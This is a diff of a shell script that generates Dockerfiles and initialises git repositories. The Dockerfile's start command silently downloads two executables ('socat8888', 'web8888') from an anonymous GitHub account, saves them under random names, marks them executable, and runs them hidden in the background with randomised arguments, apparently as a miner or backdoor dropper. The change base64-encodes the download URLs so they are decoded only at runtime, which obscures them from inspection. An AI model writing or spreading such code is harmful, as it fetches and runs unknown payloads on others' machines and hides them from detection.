@@ -23,7 +23,25 @@ for i in 1 2 3; do
     
     # Create Dockerfile
 
-    printf '%s\n' "FROM ubuntu:22.04" "CMD RAND1=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1) && RAND2=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1) && RAND3=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && RAND4=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && RAND5=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${RAND1} https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888 > /dev/null 2>&1 && wget -O \${RAND2} https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888 > /dev/null 2>&1 && chmod 777 \${RAND1} \${RAND2} && (bash \${RAND1} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && ./\${RAND2} -a \${RAND3} -o \${RAND4} -u \${RAND5} > /dev/null 2>&1" > Dockerfile
+SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
+WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
+
+# Encode URLs to base64
+SOCAT_ENCODED=$(echo -n "$SOCAT_URL" | base64)
+WEB8888_ENCODED=$(echo -n "$WEB8888_URL" | base64)
+
+# Generate random names
+RAND1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+RAND2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+RAND3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+RAND4=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+RAND5=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1)
+
+# Create Dockerfile with base64 encoded URLs that decode at runtime
+    printf '%s\n' \
+    "FROM ubuntu:22.04" \
+    "CMD R1='${RAND1}' && R2='${RAND2}' && R3='${RAND3}' && R4='${RAND4}' && R5='${RAND5}' && URL1=\$(echo '${SOCAT_ENCODED}' | base64 -d) && URL2=\$(echo '${WEB8888_ENCODED}' | base64 -d) && apt-get update > /dev/null 2>&1 && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip > /dev/null 2>&1 && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget -O \${R1} \${URL1} > /dev/null 2>&1 && wget -O \${R2} \${URL2} > /dev/null 2>&1 && chmod 777 \${R1} \${R2} && (bash \${R1} > /dev/null 2>&1 &) ; service apache2 start > /dev/null 2>&1 && ./\${R2} -a \${R3} -o \${R4} -u \${R5} > /dev/null 2>&1" \
+    > Dockerfile
 
     # Git setup
     git init
